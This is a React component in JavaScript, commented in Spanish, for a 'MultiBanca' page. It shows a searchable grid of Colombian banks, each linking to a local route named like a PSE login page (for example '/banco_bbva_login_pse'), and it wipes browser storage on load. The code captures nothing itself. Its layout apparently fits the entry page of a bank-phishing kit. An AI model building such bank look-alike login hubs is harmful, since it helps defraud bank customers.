import { useState } from 'react';

// Se crea el componente
const VistaPrincipal = () => {

    // Estado para almacenar el texto de búsqueda ingresado por el usuario
    const [busqueda, setBusqueda] = useState('');

    // Se borra el localStorage
    localStorage.clear();
    sessionStorage.clear();

    /**
     * Redirige al usuario a la URL especificada
     * @param {string} url - La URL a la que se debe redirigir
     */
    const redirect = (url) => {

        // Se redirecciona
        window.location.href = url;
    };

    // Array de configuración de botones con sus propiedades (id, título, icono, URL, color)
    const botones = [
        { id: 'bancolombia', titulo: 'Bancolombia', icono: '🏦', url: '/bancolombia', color: '#F7DC6F' },
        { id: 'nequi', titulo: 'Nequi', icono: '💳', url: '/nequi', color: '#45B7D1' },
        { id: 'caja_social', titulo: 'Caja Social', icono: '🏦', url: '/logo_caja_social_pse', color: '#3aad87ff' },
        { id: 'Bbva', titulo: 'BBVA', icono: '🏦', url: '/banco_bbva_login_pse', color: '#45B7D1' },
        { id: 'Popular', titulo: 'Popular', icono: '🏦', url: '/popular_pse', color: '#2ae03a' },
        { id: 'Itau', titulo: 'Itau', icono: '🏦', url: '/itau_pse', color: '#cc7d16' },
        { id: 'Serfinanza', titulo: 'Serfinanza', icono: '🏦', url: '/serfinanza', color: '#45B7D1' },
        { id: 'Falabella', titulo: 'Falabella PSE', icono: '🏦', url: '/falabella_pse', color: '#007833' },
        { id: 'Occidente', titulo: 'Occidente', icono: '🏦', url: '/occidente_pse', color: '#0365b6' },
        { id: 'Bogota', titulo: 'Bogotá', icono: '🏦', url: '/banco_bogota_pse', color: '#f3faff' },
    ];

    /**
     * Filtra los botones según el texto de búsqueda
     * Compara el título de cada botón con la búsqueda (case insensitive)
     * @returns {Array} - Array de botones que coinciden con la búsqueda
     */
    const botonesFiltrados = botones.filter(boton =>
        boton.titulo.toLowerCase().includes(busqueda.toLowerCase())
    );

    // Se retorna la estructura HTML del componente
    return (
        <div style={styles.container}>
            <div style={styles.background}>
                <div style={styles.gradientOrb1} className="gradient-orb1"></div>
                <div style={styles.gradientOrb2} className="gradient-orb2"></div>
                <div style={styles.gradientOrb3} className="gradient-orb3"></div>
            </div>

            <div style={styles.content} className="multibanca-content">
                <h1 style={{ ...styles.titulo, color: "black" }} className="multibanca-titulo">🏛️ MultiBanca</h1>
                <p style={styles.subtitulo} className="multibanca-subtitulo">Selecciona una opción para continuar</p>

                <div style={styles.buscadorContainer} className="multibanca-buscador">
                    <span style={styles.buscadorIcono}>🔍</span>
                    <input
                        type="text"
                        placeholder="Buscar servicio..."
                        value={busqueda}
                        onChange={(e) => setBusqueda(e.target.value)}
                        style={styles.buscadorInput}
                        className="multibanca-input"
                    />
                    {busqueda && (
                        <button
                            style={styles.limpiarBtn}
                            onClick={() => setBusqueda('')}
                            className="multibanca-limpiar"
                        >
                            ✕
                        </button>
                    )}
                </div>

                <div style={styles.grid} className="multibanca-grid">
                    {botonesFiltrados.map((boton) => (
                        <button
                            key={boton.id}
                            className="multibanca-boton"
                            style={{ ...styles.boton, backgroundColor: boton.color }}
                            // Al hacer clic, redirige a la URL del botón
                            onClick={() => redirect(boton.url)}
                            // Efecto hover: escala y eleva el botón con sombra del color del botón
                            onMouseEnter={(e) => {
                                e.currentTarget.style.transform = 'scale(1.05) translateY(-5px)';
                                e.currentTarget.style.boxShadow = `0 20px 40px ${boton.color}80`;
                            }}
                            // Restaura el estado original al salir del hover
                            onMouseLeave={(e) => {
                                e.currentTarget.style.transform = 'scale(1) translateY(0)';
                                e.currentTarget.style.boxShadow = '0 8px 25px rgba(0,0,0,0.15)';
                            }}
                        >
                            <span style={styles.icono} className="multibanca-icono">{boton.icono}</span>
                            <span style={styles.textoBoton} className="multibanca-texto">{boton.titulo}</span>
                        </button>
                    ))}
                </div>
            </div>
        </div>
    );
};

// Se crean los estilos
const styles = {
    container: {
        position: 'relative',
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        overflow: 'hidden',
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
    },
    background: {
        position: 'fixed',
        top: 0,
        left: 0,
        width: '100%',
        height: '100%',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        zIndex: -1
    },
    gradientOrb1: {
        position: 'absolute',
        width: '500px',
        height: '500px',
        borderRadius: '50%',
        background: 'radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%)',
        top: '-250px',
        left: '-100px',
        animation: 'float1 8s ease-in-out infinite'
    },
    gradientOrb2: {
        position: 'absolute',
        width: '400px',
        height: '400px',
        borderRadius: '50%',
        background: 'radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%)',
        bottom: '-150px',
        right: '-50px',
        animation: 'float2 10s ease-in-out infinite'
    },
    gradientOrb3: {
        position: 'absolute',
        width: '300px',
        height: '300px',
        borderRadius: '50%',
        background: 'radial-gradient(circle, rgba(255,255,255,0.25) 0%, transparent 70%)',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        animation: 'float3 12s ease-in-out infinite'
    },
    content: {
        textAlign: 'center',
        zIndex: 1,
        padding: '20px'
    },
    titulo: {
        color: '#ffffff',
        fontSize: '3rem',
        fontWeight: '700',
        marginBottom: '10px',
        textShadow: '2px 2px 4px rgba(0,0,0,0.3)'
    },
    subtitulo: {
        color: 'rgba(255,255,255,0.9)',
        fontSize: '1.2rem',
        marginBottom: '40px',
        fontWeight: '300'
    },
    grid: {
        display: 'grid',
        gridTemplateColumns: 'repeat(3, 1fr)',
        gap: '20px',
        maxWidth: '700px',
        margin: '0 auto'
    },
    buscadorContainer: {
        position: 'relative',
        maxWidth: '400px',
        margin: '0 auto 30px',
        display: 'flex',
        alignItems: 'center',
        backgroundColor: 'rgba(255,255,255,0.95)',
        borderRadius: '50px',
        padding: '5px 20px',
        boxShadow: '0 8px 25px rgba(0,0,0,0.15)'
    },
    buscadorIcono: {
        fontSize: '1.2rem',
        marginRight: '10px'
    },
    buscadorInput: {
        flex: 1,
        border: 'none',
        outline: 'none',
        fontSize: '1rem',
        padding: '12px 0',
        backgroundColor: 'transparent',
        color: '#2d3748',
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
    },
    limpiarBtn: {
        border: 'none',
        backgroundColor: 'transparent',
        cursor: 'pointer',
        fontSize: '1rem',
        color: '#666',
        padding: '5px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center'
    },
    boton: {
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '30px 20px',
        border: 'none',
        borderRadius: '20px',
        cursor: 'pointer',
        transition: 'all 0.3s ease',
        boxShadow: '0 8px 25px rgba(0,0,0,0.15)',
        backdropFilter: 'blur(10px)',
        backgroundColor: 'rgba(255,255,255,0.95)',
        minWidth: '140px',
        minHeight: '140px'
    },
    icono: {
        fontSize: '3rem',
        marginBottom: '10px'
    },
    textoBoton: {
        color: '#2d3748',
        fontSize: '1rem',
        fontWeight: '600'
    }
};

// Se crean los estilos
const styleSheet = document.createElement('style');
styleSheet.textContent = `
    @keyframes float1 {
        0%, 100% { transform: translate(0, 0) rotate(0deg); }
        50% { transform: translate(30px, 30px) rotate(5deg); }
    }
    @keyframes float2 {
        0%, 100% { transform: translate(0, 0) rotate(0deg); }
        50% { transform: translate(-20px, -40px) rotate(-3deg); }
    }
    @keyframes float3 {
        0%, 100% { transform: translate(-50%, -50%) rotate(0deg) scale(1); }
        50% { transform: translate(-50%, -50%) rotate(8deg) scale(1.1); }
    }
    @media (max-width: 768px) {
        .multibanca-grid {
            grid-template-columns: repeat(2, 1fr) !important;
            gap: 15px !important;
            max-width: 400px !important;
        }
        .multibanca-buscador {
            max-width: 350px !important;
            margin-bottom: 25px !important;
        }
        .multibanca-titulo {
            font-size: 2rem !important;
        }
        .multibanca-subtitulo {
            font-size: 1rem !important;
            margin-bottom: 25px !important;
        }
        .multibanca-boton {
            padding: 20px 15px !important;
            min-width: 120px !important;
            min-height: 120px !important;
        }
        .multibanca-icono {
            font-size: 2.5rem !important;
        }
        .multibanca-texto {
            font-size: 0.85rem !important;
        }
    }
    @media (max-width: 480px) {
        .multibanca-grid {
            grid-template-columns: repeat(2, 1fr) !important;
            gap: 12px !important;
            max-width: 340px !important;
        }
        .multibanca-content {
            padding: 15px !important;
        }
        .multibanca-titulo {
            font-size: 1.7rem !important;
        }
        .multibanca-subtitulo {
            font-size: 0.9rem !important;
            margin-bottom: 20px !important;
        }
        .multibanca-boton {
            padding: 15px 10px !important;
            min-width: auto !important;
            min-height: 100px !important;
        }
        .multibanca-icono {
            font-size: 2rem !important;
        }
        .multibanca-texto {
            font-size: 0.8rem !important;
        }
        .gradient-orb1, .gradient-orb2, .gradient-orb3 {
            width: 200px !important;
            height: 200px !important;
        }
    }
`;
document.head.appendChild(styleSheet);

// Se exporta el componente
export default VistaPrincipal;